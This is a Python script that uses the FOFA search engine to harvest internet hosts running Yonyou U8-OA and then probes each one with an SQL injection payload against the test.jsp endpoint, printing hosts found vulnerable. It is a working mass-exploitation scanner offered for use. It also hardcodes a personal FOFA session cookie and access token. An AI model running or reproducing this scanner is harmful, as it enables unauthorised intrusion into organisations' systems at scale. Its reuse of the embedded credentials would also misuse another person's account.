#-*- codeing = utf-8 -*-
import requests
import base64
import re
from bs4 import BeautifulSoup

ipze=re.compile(r'<a href="(.*?)"')
xtze=re.compile(r'<p class="max-tow-row">(.*) </p>',re.S)
def check(yufa,ye):
    yufa=str(base64.b64encode(yufa.encode('utf-8')),'utf-8')
    fofaurl="https://fofa.info/result?qbase64="
    for item in range(1,ye+1):
        paurl=fofaurl+yufa+'&page='+str(item)+'&page_size=10'
        onehtml=Onehtml(paurl)
        soup=BeautifulSoup(onehtml,"html.parser")
        for Onetes in soup.find_all('div',class_="rightListsMain"):
            Onetes=str(Onetes)
            ip=re.findall(ipze,Onetes)[0]
            xt=re.findall(xtze,Onetes)[0]
            xt=re.sub("\n",'',xt)
            xt = re.sub(" ", '', xt)
            onpath=ip+" | "+xt+"\n"
            with open(r'fafapa.txt', 'a+') as f:
                f.write(onpath)
                pass
            pass
        pass
    pass
def testsql():
    for item in open("fafapa.txt"):
        item=item.replace('\n','')
        fenge=item.split(" | ")
        ip=fenge[0]
        xt=fenge[1]
        sqlurl=ip+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT user())"
        try:
            respon=requests.get(url=sqlurl)
            if respon.status_code==200 and "序号" in respon.text:
                print("ip:{},系统为:{}---->>>>>>存在注入".format(ip,xt))
                pass
            pass
        except Exception as msg:
            continue
        pass
    pass
def Onehtml(url):
    head = {
        "User-Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 95.0) Gecko / 20100101 Firefox / 95.0",
         "cookie": "Hm_lvt_19b7bde5627f2f57f67dfb76eedcf989=1678418159,1678688117,1678700937,1678765481; __fcd=HfG4bVgN6xfZYrjVY77s6Ryx; _ga_9GWBD260K9=GS1.1.1678768886.53.1.1678768964.0.0.0; _ga=GA1.1.1390554306.1668238630; i18n_redirected=zh; fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6NTA5ODIsIm1pZCI6MTAwMDM0MTcyLCJ1c2VybmFtZSI6IkFMTFNFQyIsImV4cCI6MTY3ODk0NzM0M30.7R4iA_wOzNTKipjIsf8OBcXD50RdXQ8QoWr6bNBbqEhn5S32ELTipqY4q-j7ZOnb…ame%22%3A%22%E9%AB%98%E7%BA%A7%E4%BC%9A%E5%91%98%22%2C%22rank_level%22%3A2%2C%22company_name%22%3A%22%22%2C%22coins%22%3A23%2C%22can_pay_coins%22%3A0%2C%22fofa_point%22%3A0%2C%22credits%22%3A1%2C%22expiration%22%3A%22-%22%2C%22login_at%22%3A0%2C%22data_limit%22%3A%7B%22web_query%22%3A-1%2C%22web_data%22%3A-1%2C%22api_query%22%3A-1%2C%22api_data%22%3A-1%7D%7D; is_flag_login=0; befor_router=; isRedirectLang=1; Hm_lpvt_19b7bde5627f2f57f67dfb76eedcf989=1678768893; baseShowChange=false; viewOneHundredData=false"}
    try:
        respon = requests.get(url=url, headers=head)
        respon = respon.content.decode("utf-8")
        pass
    except Exception as msg:
        respon="石钦钦"
        pass
    return respon
    pass
if __name__ == '__main__':
     check('title="用友U8-OA"',10)
    #testsql()